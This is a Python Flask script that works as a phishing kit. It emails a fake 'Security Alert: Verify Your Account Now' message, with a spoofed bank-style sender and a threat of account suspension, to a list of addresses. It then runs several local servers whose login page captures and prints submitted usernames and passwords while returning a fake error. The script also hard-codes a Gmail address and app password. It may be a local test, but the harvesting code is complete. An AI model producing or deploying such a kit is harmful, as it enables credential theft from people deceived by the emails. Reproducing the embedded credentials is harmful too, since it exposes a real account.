from flask import Flask, render_template, request, jsonify, redirect
import time
import random
from datetime import datetime
import smtplib
import multiprocessing
from email.mime.text import MIMEText

EMAIL_SENDER = "wk20230401@gmail.com" # The email address for sending verification emails.
APP_PASSWORD = "llaj japl kdye cgwi" # The password corresponding the email address for SMTP.

def send_email(to_email, subject, body):
    """Create SMTP server via gmail"""
    msg = MIMEText(body,'html')
    msg["Subject"] = subject
    msg["From"] = "No-Reply <Digital-bank@gmail.com>"
    msg["To"] = to_email
    try: 
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            # server.starttls()
            server.login(EMAIL_SENDER, APP_PASSWORD)
            server.sendmail(EMAIL_SENDER, to_email, msg.as_string())
        return True
    except smtplib.SMTPException as e:
        print(f"Email sending failed: {e}")
        return False

host_name = 'localhost'
port_number_list = list(range(8080,8080+5))

server_list = []
for port in port_number_list:
    server_list.append(f'http://{host_name}:{port}')

email_list = ['wk20230401@outlook.com','z2095393809@outlook.com']
phishing_template = """<p>Dear User,</p>
    <p>We have detected suspicious activity on your account. To ensure your security, please verify your account immediately.</p>
    <p><a href="{url}" style="color: blue; text-decoration: underline;">Click here to log in</a></p>
    <p>Failure to verify within 24 hours may result in account suspension.</p>
    <p>Thank you,<br>Security Team</p>"""

def send_phishing_email():
    for address in email_list:
        phishing_subject = 'Security Alert: Verify Your Account Now'
        phishing_content = phishing_template.format(url=random.choice(server_list))
        send_email(address, phishing_subject, phishing_content)

def launch_server(host_name, port_number):
    """Launch one server."""
    app = Flask(__name__, static_folder="static", template_folder="templates")

    @app.route("/", methods=['GET', 'POST'])
    def home():
        if request.method == 'POST':
            username = request.form['username']
            password = request.form['password']
            print(f'The username is: {username}. \n The password is: {password}')
            return jsonify({"error": "Invalid credentials"}), 403
        return render_template("login.html")
    
    app.run(host=host_name, port=port_number)

def launch_multiple_servers():
    """Launch multiple phishing servers."""
    processes = []

    for i in range(0,len(server_list)):
        p = multiprocessing.Process(target=launch_server, 
                                    args=(host_name,port_number_list[i]))
        p.start()
        processes.append(p)

    for p in processes:
        p.join()

if __name__ == "__main__":
    # record start time
    start_timestamp = time.time()
    start_time = datetime.fromtimestamp(start_timestamp).strftime('%Y-%m-%d %H:%M:%S')
    print(f"severs start at {start_time}")

    try:
        send_phishing_email()
        launch_multiple_servers()
    except KeyboardInterrupt:
        pass

    # record end time
    end_timestamp = time.time()
    end_time = datetime.fromtimestamp(end_timestamp).strftime('%Y-%m-%d %H:%M:%S')
    print(f"severs end at {end_time}")